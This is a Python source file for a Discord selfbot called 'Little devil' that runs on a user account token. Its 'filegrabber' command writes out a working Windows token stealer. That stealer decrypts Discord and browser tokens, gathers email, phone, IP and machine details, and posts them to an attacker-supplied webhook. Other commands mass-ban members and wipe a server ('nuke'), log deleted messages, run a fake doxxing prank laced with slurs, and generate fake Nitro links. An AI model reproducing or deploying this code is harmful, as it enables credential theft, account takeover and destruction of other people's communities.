try:
    import time
    import os
    import platform
    
    osname = platform.system()
    purple = "\033[95m"
    reset = "\033[0m"
    cyan = "\033[96m"
    red = "\033[91m"
    kek = print(f"{cyan}Note you can click on the install.bat and install the libraries automatically or type y on the following input{reset}")
    time.sleep(2)
    while True:
        package = input(f'{purple}Would you like to install the packages? Y/N: {reset}')
        if package == "y" or package == "Y":
            # os.startfile(os.path.join(os.getcwd(), 'install.bat'))
            os.system("echo Little devil manual installation:")
            os.system("pip install -r requirements.txt")
            break
        elif package == "n" or package == "N":
            break
        else:
            print(f'{red}Wrong choice{reset}')


    import discord
    from discord.ext import commands
    import asyncio
    from discord import Forbidden
    import requests
    import keyboard
    import string
    import random
    import aiohttp
    import io
    import pystyle
    import json
    import sys

    """
    If you want to install all these packages here you go:
    discord
    discord.py
    aiohttp
    requests
    pystyle
    discord.py-self


    IF YOU FIND ERRORS READ THE README FILE!!!

    DISCLAIMER:
        
    Note that some commands here are made by astraa so credits to him 

    """

    with open('config.json', 'r') as f:    
        config = json.load(f)


    IPINFO_API_TOKEN = config['APITOKEN'] # get it at ipinfo.io
    PREFIX = ">"
    #put yo token over here lol
    TOKEN = config['TOKEN'] #input token here
    


    pystyle.System.Title("Lil devil selfbot By ELDIABLO")

    bot = commands.Bot(command_prefix=PREFIX, help_command=None, self_bot=True, chunk_guilds_at_startup=True)
    bot.remove_command('help')




    @bot.event
    async def on_ready():
        if osname == "Windows":
            os.system('cls')
        elif osname == "Linux":
            os.system('clear')
        text = '''


            ▄▄▌  ▪  ▄▄▄▄▄▄▄▄▄▄▄▄▌  ▄▄▄ .    ·▄▄▄▄  ▄▄▄ . ▌ ▐·▪  ▄▄▌  
            ██•  ██ •██  •██  ██•  ▀▄.▀·    ██▪ ██ ▀▄.▀·▪█·█▌██ ██•  
            ██▪  ▐█· ▐█.▪ ▐█.▪██▪  ▐▀▀▪▄    ▐█· ▐█▌▐▀▀▪▄▐█▐█•▐█·██▪  
            ▐█▌▐▌▐█▌ ▐█▌· ▐█▌·▐█▌▐▌▐█▄▄▌    ██. ██ ▐█▄▄▌ ███ ▐█▌▐█▌▐▌
            .▀▀▀ ▀▀▀ ▀▀▀  ▀▀▀ .▀▀▀  ▀▀▀     ▀▀▀▀▀•  ▀▀▀ . ▀  ▀▀▀.▀▀▀         


    '''

        if config['MSGSNIPE'] != True:
            pystyle.Write.Print('MSGSNIPE is set to false, change it in the config file', pystyle.Colors.red_to_yellow, interval=0.020)
            


        #print(pystyle.Colorate.Vertical(pystyle.Colors.yellow_to_red, text, 1))
        colortext = pystyle.Colorate.Vertical(pystyle.Colors.purple_to_blue, pystyle.Center.XCenter(text), 1)
        print(colortext)
        activity = discord.Streaming(name="Little devil", url="https://www.youtube.com/watch?v=2g5xkLqIElU")
        await bot.change_presence(activity=activity)
        time.sleep(1)
        boxtext = f"[+] Logged in as: {bot.user.name}\n[+] UserID: {bot.user.id}\n[+] Design is inspired from PWNSEC\n[+] Startup command: >help\n[+] MSGSNIPING: {config['MSGSNIPE']}"
        box = pystyle.Box.Lines(boxtext)
        centerbox = pystyle.Center.XCenter(pystyle.Colorate.Vertical(pystyle.Colors.purple_to_blue, box, 1))
        print(centerbox)

    """
    @bot.command()
    async def chatspam(ctx, message: str, count: int, delay: float):
        guild = ctx.guild
        tasks = []

        # Create tasks for sending messages concurrently
        for channel in guild.text_channels:
            tasks.extend([channel.send(message) for _ in range(count)])

        # Send messages concurrently
        await asyncio.gather(*tasks)

        # Clear the console screen after sending messages
        os.system('cls' if os.name == 'nt' else 'clear')

        print('''
            
            ▄▄▄   ▄▄▄· ▪  ·▄▄▄▄      .▄▄ · ▄▄▄ .▄▄▌  ·▄▄▄▄▄▄▄·       ▄▄▄▄▄
            ▀▄ █·▐█ ▀█ ██ ██▪ ██     ▐█ ▀. ▀▄.▀·██•  ▐▄▄·▐█ ▀█▪▪     •██  
            ▐▀▀▄ ▄█▀▀█ ▐█·▐█· ▐█▌    ▄▀▀▀█▄▐▀▀▪▄██▪  ██▪ ▐█▀▀█▄ ▄█▀▄  ▐█.▪
            ▐█•█▌▐█ ▪▐▌▐█▌██. ██     ▐█▄▪▐█▐█▄▄▌▐█▌▐▌██▌.██▄▪▐█▐█▌.▐▌ ▐█▌·
            .▀  ▀ ▀  ▀ ▀▀▀▀▀▀▀▀•      ▀▀▀▀  ▀▀▀ .▀▀▀ ▀▀▀ ·▀▀▀▀  ▀█▄▀▪ ▀▀▀ 
            
            You are still logged in by the way :)
                    
            ''')
    """


    if config['MSGSNIPE']:
        @bot.event
        async def on_message_delete(message):
            message_time = message.created_at.strftime('%Y-%m-%d %H:%M:%S')
            if message.author == bot.user:
                return
            if message.author != bot.user:
                if message.guild is None:
                    if isinstance(message.channel, discord.DMChannel):
                        pystyle.Write.Print(f'[DM!] Message is deleted by: "{message.author.name}" in DM, Message: "{message.content}", Time: {message_time}\n', pystyle.Colors.purple_to_blue, interval=0.02)
                    else:
                        pystyle.Write.Print(f'[GC!] Message is deleted by: "{message.author.name}" in a certain GC, Message: "{message.content}", Time: {message_time}\n', pystyle.Colors.purple_to_blue, interval=0.02)
                else:
                    pystyle.Write.Print(f'[SERVER!] Message is deleted by: "{message.author.name}" in "{message.guild}", #{message.channel.name}, Message: "{message.content}", Time: {message_time}\n', pystyle.Colors.purple_to_blue, interval=0.02)




    @bot.command(aliases=["pornhubcomment", 'phc'])
    async def phcomment(ctx, user: str = None, *, args=None):
        await ctx.message.add_reaction('✅')
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
        await ctx.message.delete()
        if user is None or args is None:
            await ctx.send(f'[ERROR]: Invalid input! Command: {bot.command_prefix}phcomment <message>')
            return
        avatar_url = ctx.author.avatar.url if ctx.author.avatar else ctx.author.default_avatar.url
        endpoint = f"https://nekobot.xyz/api/imagegen?type=phcomment&text={args}&username={user}&image={avatar_url}"
        r = requests.get(endpoint)
        res = r.json()
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(res["message"]) as resp:
                    image = await resp.read()
            with io.BytesIO(image) as file:
                await ctx.send(file=discord.File(file, f"astraa_pornhub_comment.png"))
                
        except Exception as e:
            await ctx.send(f'[ERROR]: An error occurred while processing the image: {str(e)}')



    @bot.command(aliases=["copyguild", "copyserver"])
    async def copy(ctx):
        await ctx.message.add_reaction('✅')
        await ctx.message.delete()
        await bot.create_guild(f'backup-{ctx.guild.name}')
        await asyncio.sleep(4)
        for g in bot.guilds:
            if f'backup-{ctx.guild.name}' in g.name:
                for c in g.channels:
                    await c.delete()
                for cate in ctx.guild.categories:
                    x = await g.create_category(f"{cate.name}")
                    for chann in cate.channels:
                        if isinstance(chann, discord.VoiceChannel):
                            await x.create_voice_channel(f"{chann}")
                        if isinstance(chann, discord.TextChannel):
                            await x.create_text_channel(f"{chann}")
                            print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
        try:
            await g.edit(icon=ctx.guild.icon_url)
        except Exception as e:
            await ctx.send(f'[ERROR]: {e}')



    @bot.command()
    async def exit(ctx):
        await ctx.message.add_reaction('✅')
        print(f'Exiting python process, Logging out of {bot.user.name}')
        await ctx.send('```ini\n [exiting] ```')
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
        await bot.change_presence(activity=None)
        os._exit(0)


 

    @bot.command()
    async def info(ctx, user: discord.User):
        await ctx.message.add_reaction('✅')
        user_id = user.id
        username = user.name
        tag = user.discriminator
        created_at = user.created_at.strftime("%Y-%m-%d %H:%M:%S")
        avatar_url = user.avatar.url if user.avatar else user.default_avatar_url
        
        
        badges = []
        if user.public_flags.staff:
            badges.append('Staff')
        if user.public_flags.partner:
            badges.append('Partner')
        if user.public_flags.hypesquad:
            badges.append('HypeSquad')
        
        
        badges_str = ', '.join(badges) if badges else 'None'
        
        response = (
            f'[UserInfo]\n'
            f'UserID = {user_id}\n'
            f'Username = {username}#{tag}\n'
            f'Avatar = {avatar_url}\n'
            f'AccountCreationDate = {created_at}\n'
            f'\n'
            f'[AccountBadges]\n'
            f'Badges = {badges_str}\n'
        )
        
        await ctx.send(f'```ini\n{response}```')
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
        
    @bot.command()
    async def geocode(ctx, latitude, longitude):
        await ctx.message.add_reaction('✅')
        response = f"```diff\n- Address: ```https://maps.google.com/?q={latitude},{longitude}"
        await ctx.send(response)
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')

    @bot.command()
    async def ping(ctx):
        await ctx.message.add_reaction('✅')
        ping = round(bot.latency * 1000)
        response = f'Pong! {ping} MS'
        await ctx.send(response)
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')

    @bot.command(aliases=["nitrogen"])
    async def nitro(ctx):
        await ctx.message.add_reaction('✅')
        await ctx.message.delete()
        code = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        await ctx.send(f'https://discord.gift/{code}')
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')


    @bot.command()
    async def iplookup(ctx, ip: str):
        await ctx.message.add_reaction('✅')
        url = f"https://ipinfo.io/{ip}/json?token={IPINFO_API_TOKEN}"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            ip = data.get('ip', 'N/A')
            city = data.get('city', 'N/A')
            region = data.get('region', 'N/A')
            country = data.get('country', 'N/A')
            loc = data.get('loc', 'N/A')
            org = data.get('org', 'N/A')
            postal = data.get('postal', 'N/A')
            timezone = data.get('timezone', 'N/A')
            
            response = (
                f"```ini\n"
                f"[IP Information for {ip}]\n"
                f"[City] = {city}\n"
                f"[Region] = {region}\n"
                f"[Country] = {country}\n"
                f"[Location] = {loc}\n"
                f"[Organization] = {org}\n"
                f"[Postal Code] = {postal}\n"
                f"[Timezone] = {timezone}\n"
                f"```"
            )
        else:
            response = f"Could not retrieve information for IP: {ip}. Please ensure the IP address is valid."
        message  =  await ctx.send("```ini\n[Stand by as we fetch the ip]\n```")
        time.sleep(2)
        await message.edit(content = response)
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')

    @bot.command()
    async def minesweeper(ctx, size: int=5):
        await ctx.message.add_reaction('✅')
        #await ctx.message.delete()
        size = max(min(size, 8), 2)
        
        bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for _ in range(size - 1)]
        is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
        has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
        
        m_numbers = ['1️⃣', '2️⃣', '3️⃣', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣']
        m_offsets = [(-1, -1), (-1, 0), (-1, 1), (0, -1), (0, 1), (1, -1), (1, 0), (1, 1)]
        
        message = "**Click to play**:\n"
        for y in range(size):
            for x in range(size):
                tile = "||{}||".format(chr(11036))  
                if has_bomb(x, y):
                    tile = "||{}||".format(chr(128163))  
                else:
                    count = 0
                    for xmod, ymod in m_offsets:
                        if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                            count += 1
                    if count != 0:
                        tile = "||{}||".format(m_numbers[count - 1])
                message += tile
            message += "\n"
        
        await ctx.send(message)
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')



    @bot.command()
    async def hack(ctx, user: discord.Member=None):
        await ctx.message.add_reaction('✅')
        await ctx.message.delete()
        gender = ["Male", "Female", "Trans", "Other", "Retard"]
        age = str(random.randrange(10, 25))
        height = ['4\'6\"', '4\'7\"', '4\'8\"', '4\'9\"', '4\'10\"', '4\'11\"', '5\'0\"', '5\'1\"', '5\'2\"', '5\'3\"',
                '5\'4\"', '5\'5\"',
                '5\'6\"', '5\'7\"', '5\'8\"', '5\'9\"', '5\'10\"', '5\'11\"', '6\'0\"', '6\'1\"', '6\'2\"', '6\'3\"',
                '6\'4\"', '6\'5\"',
                '6\'6\"', '6\'7\"', '6\'8\"', '6\'9\"', '6\'10\"', '6\'11\"']
        weight = str(random.randrange(60, 300))
        hair_color = ["Black", "Brown", "Blonde", "White", "Gray", "Red"]
        skin_color = ["White", "Pale", "Brown", "Black", "Light-Skin"]
        religion = ["Christian", "Muslim", "Atheist", "Hindu", "Buddhist", "Jewish"]
        sexuality = ["Straight", "Gay", "Homo", "Bi", "Bi-Sexual", "Lesbian", "Pansexual"]
        education = ["High School", "College", "Middle School", "Elementary School", "Pre School",
                    "Retard never went to school LOL"]
        ethnicity = ["White", "African American", "Asian", "Latino", "Latina", "American", "Mexican", "Korean", "Chinese",
                    "Arab", "Italian", "Puerto Rican", "Non-Hispanic", "Russian", "Canadian", "European", "Indian"]
        occupation = ["Retard has no job LOL", "Certified discord retard", "Janitor", "Police Officer", "Teacher",
                    "Cashier", "Clerk", "Waiter", "Waitress", "Grocery Bagger", "Retailer", "Sales-Person", "Artist",
                    "Singer", "Rapper", "Trapper", "Discord Thug", "Gangster", "Discord Packer", "Mechanic", "Carpenter",
                    "Electrician", "Lawyer", "Doctor", "Programmer", "Software Engineer", "Scientist"]
        salary = ["Retard makes no money LOL", "$" + str(random.randrange(0, 1000)), '<$50,000', '<$75,000', "$100,000",
                "$125,000", "$150,000", "$175,000",
                "$200,000+"]
        location = ["Retard lives in his mom's basement LOL", "America", "United States", "Europe", "Poland", "Mexico",
                    "Russia", "Pakistan", "India",
                    "Some random third world country", "Canada", "Alabama", "Alaska", "Arizona", "Arkansas", "California",
                    "Colorado", "Connecticut", "Delaware", "Florida", "Georgia", "Hawaii", "Idaho", "Illinois", "Indiana",
                    "Iowa", "Kansas", "Kentucky", "Louisiana", "Maine", "Maryland", "Massachusetts", "Michigan",
                    "Minnesota", "Mississippi", "Missouri", "Montana", "Nebraska", "Nevada", "New Hampshire", "New Jersey",
                    "New Mexico", "New York", "North Carolina", "North Dakota", "Ohio", "Oklahoma", "Oregon",
                    "Pennsylvania", "Rhode Island", "South Carolina", "South Dakota", "Tennessee", "Texas", "Utah",
                    "Vermont", "Virginia", "Washington", "West Virginia", "Wisconsin", "Wyoming"]
        email = ["@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@protonmail.com", "@disposablemail.com",
                "@aol.com", "@edu.com", "@icloud.com", "@gmx.net", "@yandex.com"]
        dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'
        name = ['James Smith', "Michael Smith", "Robert Smith", "Maria Garcia", "David Smith", "Maria Rodriguez",
                "Mary Smith", "Maria Hernandez", "Maria Martinez", "James Johnson", "Catherine Smoaks", "Cindi Emerick",
                "Trudie Peasley", "Josie Dowler", "Jefferey Amon", "Kyung Kernan", "Lola Barreiro",
                "Barabara Nuss", "Lien Barmore", "Donnell Kuhlmann", "Geoffrey Torre", "Allan Craft",
                "Elvira Lucien", "Jeanelle Orem", "Shantelle Lige", "Chassidy Reinhardt", "Adam Delange",
                "Anabel Rini", "Delbert Kruse", "Celeste Baumeister", "Jon Flanary", "Danette Uhler", "Xochitl Parton",
                "Derek Hetrick", "Chasity Hedge", "Antonia Gonsoulin", "Tod Kinkead", "Chastity Lazar", "Jazmin Aumick",
                "Janet Slusser", "Junita Cagle", "Stepanie Blandford", "Lang Schaff", "Kaila Bier", "Ezra Battey",
                "Bart Maddux", "Shiloh Raulston", "Carrie Kimber", "Zack Polite", "Marni Larson", "Justa Spear"]
        phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'
        if user is None:
            user = ctx.author
            password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                        "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                        "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
            message = await ctx.send(f"`Hacking {user}...\n`")
            await asyncio.sleep(1)
            await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
            await asyncio.sleep(1)
            await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
            await asyncio.sleep(1)
            await message.edit(
                content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
            await asyncio.sleep(1)
            await message.edit(
                content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
            await asyncio.sleep(1)
            await message.edit(
                content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
            await asyncio.sleep(1)
            await message.edit(
                content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
        else:
            password = ['password', '123', 'mypasswordispassword', user.name + "iscool123", user.name + "isdaddy",
                        "daddy" + user.name, "ilovediscord", "i<3discord", "furryporn456", "secret", "123456789", "apple49",
                        "redskins32", "princess", "dragon", "password1", "1q2w3e4r", "ilovefurries"]
            message = await ctx.send(f"`Hacking {user}...\n`")
            await asyncio.sleep(1)
            await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\n`")
            await asyncio.sleep(1)
            await message.edit(content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...`")
            await asyncio.sleep(1)
            await message.edit(
                content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\n`")
            await asyncio.sleep(1)
            await message.edit(
                content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...`")
            await asyncio.sleep(1)
            await message.edit(
                content=f"`Hacking {user}...\nHacking into the mainframe...\nCaching data...\nCracking SSN information...\nBruteforcing love life details...\nFinalizing life-span dox details\n`")
            await asyncio.sleep(1)
            await message.edit(
                content=f"```Successfully hacked {user}\nName: {random.choice(name)}\nGender: {random.choice(gender)}\nAge: {age}\nHeight: {random.choice(height)}\nWeight: {weight}\nHair Color: {random.choice(hair_color)}\nSkin Color: {random.choice(skin_color)}\nDOB: {dob}\nLocation: {random.choice(location)}\nPhone: {phone}\nE-Mail: {user.name + random.choice(email)}\nPasswords: {random.choices(password, k=3)}\nOccupation: {random.choice(occupation)}\nAnnual Salary: {random.choice(salary)}\nEthnicity: {random.choice(ethnicity)}\nReligion: {random.choice(religion)}\nSexuality: {random.choice(sexuality)}\nEducation: {random.choice(education)}```")
            print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
            
    @bot.command(aliases=["renameserver", "nameserver"])
    async def servername(ctx, *, name=None):
        await ctx.message.add_reaction('✅')
        await ctx.message.delete()
        if name is None:
            await ctx.send(f'[ERROR]: Invalid input! Command: {bot.command_prefix}servername <name>')
            return
        await ctx.guild.edit(name=name)
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')





    @bot.command()
    async def help(ctx):
        await ctx.message.add_reaction('✅')
        message = await ctx.send("```ini\n[Welcome to Little Devil selfbot created by el diablo, please stand by]\n```")
        await asyncio.sleep(1)  
        new_message = f"```ini\nCreated by diablo | Version 2.5 | PREFIX = {PREFIX}\n \n[>raid]: >raid <message> <numberoftimes> <delay put 0> <specify channel if not then it will spam in all> (dont forget to remove the <>)\n[>info]: >info <userid> or <username>\n[>ping]: Returns your MS\n[>geocode]: >geocode <latitude> <longitude> (must be integers)\n[>exit]: Exits out of the selfbot\n[>iplookup]: >iplookup <ip>\n[>nitro]: self explanatory, generates nitro \n[>minesweeper]: play a game of minesweeper :D\n[>filegrabber (webhook)]: >filegrabber (put webhook url) all this does is make a token grabber py file\n[>nuke]: This time it requires admin\n[>hack]: >hack (user) this time its a fun command\n[>guildicon]: >self explanatory\n[>servername]: <name>\n[>massreact (emoji)]: >massreact (select the emoji you wana react with)\n[>purge]: >purge (int)\n[>tableflip]: does the cool thing\n[>lenny]: another cool thing\n[>shrug]: ANOTHER COOL THING\n[>unflip]: wowww\n[>phcomment] >phcomment <username> <comment>\n[>rage]: >rage (userid) replies L to them everytime they say something in chat\n[>911]: send a 911 animation with emojis\n[>fuck]: <userid> sends an ascii of you fucking him lmfao\n[>clear]: clears the terminal screen so you wont get bothered [LOGGED MESSAGES GET DELETED!!!]\n[>gc]: this will make a gc: >gc [MAX] [NUMOFTIMES] [YOUR ALT'S ID] [TARGET'S ID]\n[>block]: this will block all your friends\n[>guildleave]: leaves all your guilds```"
        await message.edit(content=new_message)
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')

    @bot.command(aliases=["rekt", "nuke"])
    async def destroy(ctx):
        await ctx.message.add_reaction('✅')
        await ctx.message.delete()
        for user in list(ctx.guild.members):
            try:
                await user.ban()
            except:
                pass
        for channel in list(ctx.guild.channels):
            try:
                await channel.delete()
            except:
                pass
        for role in list(ctx.guild.roles):
            try:
                await role.delete()
            except:
                pass
        try:
            await ctx.guild.edit(
                name="".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(14, 32))),
                description="sry <3",
                reason="sry <3",
                icon=None,
                banner=None
            )
        except:
            pass
        for _i in range(250):
            await ctx.guild.create_text_channel(name="Nuked by the fucking dev \ EL DIABLO")
        for _i in range(250):
            randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
            await ctx.guild.create_role(name="Nuked by the fucking dev \ EL DIABLO", color=randcolor)
            print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')


    @bot.command()
    async def massreact(ctx, emote=None):
        await ctx.message.add_reaction('✅')
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
        await ctx.message.delete()
        if emote is None:
            await ctx.send(f'[ERROR]: Invalid input! Command: {bot.command_prefix}massreact <emote>')
            return
        
        messages = [message async for message in ctx.message.channel.history(limit=20)]
        for message in messages:
            try:
                await message.add_reaction(emote)
            except Exception as e:
                print(f"Failed to react to message: {e}")


    @bot.command(aliases=["grabfile", "tokenfile"])
    async def filegrabber(ctx, webhook=None):
        await ctx.message.add_reaction('✅')
        await ctx.message.delete()
        if webhook is None:
            await ctx.send(f'[ERROR]: Invalid input! Command: {PREFIX}filegrabber <webhook>')
            return
        try:
            with open(f"printer.py", "w") as file:
                file.write("""from base64 import b64decode
    from Crypto.Cipher import AES
    from win32crypt import CryptUnprotectData
    from os import getlogin, listdir
    from json import loads
    from re import findall
    from urllib.request import Request, urlopen
    from subprocess import Popen, PIPE
    import requests, json, os
    from datetime import datetime
    tokens = []
    cleaned = []
    checker = []
    def decrypt(buff, master_key):
        try:
            return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
        except:
            return "Error"
    def getip():
        ip = "None"
        try:
            ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
        except: pass
        return ip
    def gethwid():
        p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
        return (p.stdout.read() + p.stderr.read()).decode().split("\\n")[1]
    def get_token():
        already_check = []
        checker = []
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        chrome = local + "\\\\Google\\\\Chrome\\\\User Data"
        paths = {
            'Discord': roaming + '\\\\discord',
            'Discord Canary': roaming + '\\\\discordcanary',
            'Lightcord': roaming + '\\\\Lightcord',
            'Discord PTB': roaming + '\\\\discordptb',
            'Opera': roaming + '\\\\Opera Software\\\\Opera Stable',
            'Opera GX': roaming + '\\\\Opera Software\\\\Opera GX Stable',
            'Amigo': local + '\\\\Amigo\\\\User Data',
            'Torch': local + '\\\\Torch\\\\User Data',
            'Kometa': local + '\\\\Kometa\\\\User Data',
            'Orbitum': local + '\\\\Orbitum\\\\User Data',
            'CentBrowser': local + '\\\\CentBrowser\\\\User Data',
            '7Star': local + '\\\\7Star\\\\7Star\\\\User Data',
            'Sputnik': local + '\\\\Sputnik\\\\Sputnik\\\\User Data',
            'Vivaldi': local + '\\\\Vivaldi\\\\User Data\\\\Default',
            'Chrome SxS': local + '\\\\Google\\\\Chrome SxS\\\\User Data',
            'Chrome': chrome + 'Default',
            'Epic Privacy Browser': local + '\\\\Epic Privacy Browser\\\\User Data',
            'Microsoft Edge': local + '\\\\Microsoft\\\\Edge\\\\User Data\\\\Defaul',
            'Uran': local + '\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default',
            'Yandex': local + '\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default',
            'Brave': local + '\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default',
            'Iridium': local + '\\\\Iridium\\\\User Data\\\\Default'
        }
        for platform, path in paths.items():
            if not os.path.exists(path): continue
            try:
                with open(path + f"\\\\Local State", "r") as file:
                    key = loads(file.read())['os_crypt']['encrypted_key']
                    file.close()
            except: continue
            for file in listdir(path + f"\\\\Local Storage\\\\leveldb\\\\"):
                if not file.endswith(".ldb") and file.endswith(".log"): continue
                else:
                    try:
                        with open(path + f"\\\\Local Storage\\\\leveldb\\\\{file}", "r", errors='ignore') as files:
                            for x in files.readlines():
                                x.strip()
                                for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\\"]*", x):
                                    tokens.append(values)
                    except PermissionError: continue
            for i in tokens:
                if i.endswith("\\\\"):
                    i.replace("\\\\", "")
                elif i not in cleaned:
                    cleaned.append(i)
            for token in cleaned:
                try:
                    tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
                except IndexError == "Error": continue
                checker.append(tok)
                for value in checker:
                    if value not in already_check:
                        already_check.append(value)
                        headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                        try:
                            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                        except: continue
                        if res.status_code == 200:
                            res_json = res.json()
                            ip = getip()
                            pc_username = os.getenv("UserName")
                            pc_name = os.getenv("COMPUTERNAME")
                            user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                            user_id = res_json['id']
                            email = res_json['email']
                            phone = res_json['phone']
                            mfa_enabled = res_json['mfa_enabled']
                            has_nitro = False
                            res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                            nitro_data = res.json()
                            has_nitro = bool(len(nitro_data) > 0)
                            days_left = 0
                            if has_nitro:
                                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                                days_left = abs((d2 - d1).days)
                            embed = f\"""**{user_name}** *({user_id})*\n
    > :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
    > :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n\tPlatform: `{platform}`\n
    > :shield: __Token__\n\t`{tok}`\n
    *Made by Astraa#6100* **|** ||https://github.com/astraadev||\"""
                            payload = json.dumps({'content': embed, 'username': 'Token Grabber - Made by Astraa', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                            try:
                                headers2 = {
                                    'Content-Type': 'application/json',
                                    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
                                }
                                req = Request('~~WEBHOOK_URL~~', data=payload.encode(), headers=headers2)
                                urlopen(req)
                            except: continue
                    else: continue
    if __name__ == '__main__':
        get_token()""".replace("~~WEBHOOK_URL~~", webhook))
            await ctx.send(file=discord.File("printer.py"))
            print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')
            os.remove(f"printer.py")

        except Exception as e:
            await ctx.send(f"[ERROR]: {e}")


    @bot.command()
    async def shrug(ctx):
        await ctx.message.add_reaction('✅')
        await ctx.message.delete()
        shrug = r'¯\_(ツ)_/¯'
        await ctx.send(shrug)
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')



    @bot.command()
    async def guildleave(ctx):
        await ctx.message.add_reaction('✅')
        time.sleep(0.3)
        await ctx.message.delete()
        print(f'{ctx.message.author.name} sent the commmand: {ctx.message.content}')
        for guild in bot.guilds:
            await bot.leave_guild(guild)


    @bot.command()
    async def block(ctx):
        await ctx.message.add_reaction('✅')
        time.sleep(0.3)
        await ctx.message.delete()
        print(f'{ctx.message.author.name} sent the command {ctx.message.content}')
        for friend in bot.friends:
            frienduser = friend.user
            print(frienduser.name)
            await frienduser.block()




    @bot.command()
    async def lenny(ctx):
        await ctx.message.add_reaction('✅')
        await ctx.message.delete()
        lenny = '( ͡° ͜ʖ ͡°)'
        await ctx.send(lenny)
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')

    @bot.command(aliases=["fliptable"])
    async def tableflip(ctx):
        await ctx.message.add_reaction('✅')
        await ctx.message.delete()
        tableflip = '(╯°□°）╯︵ ┻━┻'
        await ctx.send(tableflip)
        print(f'{ctx.message.author.name} sent the command: {ctx.message.content}')

    @bot.command()
    async def unflip(ctx):
        await ctx.message.add_reaction('✅')
        await ctx.message.delete()
        unflip = '┬─┬ ノ( ゜-゜ノ)'
        await ctx.send(unflip)
